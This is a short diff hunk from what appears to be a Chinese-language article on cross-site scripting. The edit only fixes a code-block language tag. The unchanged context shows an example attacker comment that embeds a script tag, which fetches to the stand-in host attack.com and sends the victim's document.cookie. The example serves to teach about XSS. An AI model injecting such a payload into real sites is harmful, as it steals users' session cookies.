@@ -62,7 +62,7 @@ function replaceSpecialSymbol(str) {
 
 攻击者在文章下面发表了一篇评论，内容中包含了 script 脚本：
 
-```ba'sh
+```bash
 文章写的真棒！<script>fetch(`http://attack.com/cookies?cookie=${document.cookie}`)</script>
 ```
 
